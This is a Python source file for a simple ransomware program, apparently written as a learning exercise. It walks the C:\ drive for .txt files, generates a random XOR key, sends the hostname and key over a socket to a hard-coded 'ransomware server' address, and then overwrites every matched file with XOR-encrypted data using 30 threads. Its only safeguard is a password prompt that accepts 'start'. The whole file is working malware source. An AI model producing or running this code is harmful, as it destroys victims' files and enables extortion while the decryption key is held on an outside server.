# 1. put a safeguard at beginning for testing purpose
# 2. supply file extensions to encrypt
# 3. grab all files from machine and put them in a list
# 4. generate key
# 5. grab host name
# 6. send hostname and key back to server
# 7. encrypt all files in file list
import os
import random
import socket
from datetime import datetime
from threading import Thread
from queue import Queue


# safeguard password:
safeguard = input("please enter the safeguard password: ")
if safeguard != "start":
    quit()


# file extensions to encrypt:
encrypted_ext = ('.txt',)


# grab all files from the machine:
file_paths = []
for root, dirs, files in os.walk('C:\\'):
    for file in files:
        file_path, file_ext = os.path.splitext(root+'\\'+file)
        if file_ext in encrypted_ext:
            file_paths.append(root+'\\'+file)


# generate key:
char_pool = ''
for i in range(0x00, 0xFF):
    char_pool += (chr(i))

key = ''
encryption_level = 128 // 8
for i in range(encryption_level):
    key += random.choice(char_pool)


# get host name:
hostname = os.getenv('COMPUTERNAME')


# connect to the ransomware server and send hostname and key:
ip_address = '192.168.7.36'
port = 5678
time = datetime.now()
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((ip_address, port))
    s.send(f"[{time}] - {hostname}:{key}".encode('utf-8'))


# encrypt files:
def encrypt(key):
    while q.not_empty:
        file = q.get()
        index = 0
        max_index = encryption_level - 1
        try:
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'wb') as f:
                for byte in data:
                    xor_byte = byte ^ ord(key[index])
                    f.write(xor_byte.to_bytes(1, 'little'))
                    if index >= max_index:
                        index = 0
                    else:
                        index += 1
        except:
            print(f"Failed to encrypt {file} ...")
        q.task_done()


q = Queue()
for file in file_paths:
    q.put(file)
for i in range(30):
    thread = Thread(target=encrypt, args=(key,), daemon=True)
    thread.start()


q.join()
print("Encryption was successful.")